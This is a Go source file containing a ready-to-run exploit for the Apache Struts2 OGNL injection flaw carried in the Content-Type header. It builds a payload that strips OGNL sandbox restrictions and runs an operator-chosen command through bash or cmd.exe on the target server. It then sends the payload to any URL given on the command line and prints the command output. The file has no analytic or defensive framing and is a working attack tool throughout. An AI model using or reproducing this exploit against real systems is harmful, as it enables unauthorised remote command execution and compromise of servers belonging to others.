package main

import (
    "fmt"
    "flag"
    "time"
    "strings"
    "net/http"
    "io/ioutil"
)

var (
    vv  bool
    url string
    cmd string
    payload = "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)." +
    "(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container'])." +
    "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))." +
    "(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear())." +
    "(#context.setMemberAccess(#dm)))).(#cmd='fuck').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))." +
    "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true))." +
    "(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse()." +
    "getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
)

func catch() {
    if err := recover(); err != nil {
        fmt.Println("[-]", err)
    }
}

func evilCmd(url string, cmd string) {
    defer catch()
    initPayload := strings.Replace(payload, "fuck", cmd, -1)
    timeout := time.Duration(5 * time.Second)
    client := &http.Client{Timeout: timeout}
    req, _ := http.NewRequest("POST", url, nil)
    req.Header.Add("User-Agent", "WTF/1.0")
    req.Header.Add("Content-Type", initPayload)
    res, err := client.Do(req)
    if err != nil { panic("URL connection failed") }
    defer res.Body.Close()
    bodyBytes, _ := ioutil.ReadAll(res.Body)
    bodyString := string(bodyBytes)
    exist := strings.Contains(bodyString, "</html>")
    if (res.StatusCode == http.StatusOK) && (!exist) {
        fmt.Println("[+]", "target is vulnerable")
        if vv {
            for k, v := range res.Header {
                fmt.Printf("[*] %-12s => %s\n", k, v)
            }
        }
        fmt.Printf("\n%s", bodyString)
    } else {
        panic("exploit failed")
    }
}

func main() {
    flag.BoolVar(&vv, "vv", false, "show details")
    flag.StringVar(&cmd, "cmd", "whoami", "exec evil cmd")
    flag.StringVar(&url, "url", "", "target URL (e.g. \"http://www.site.com/index.action\")")
    flag.Parse()
    if len(url) > 0 && len(cmd) > 0 {
        evilCmd(url, cmd)
    } else {
        flag.Usage()
    }
}
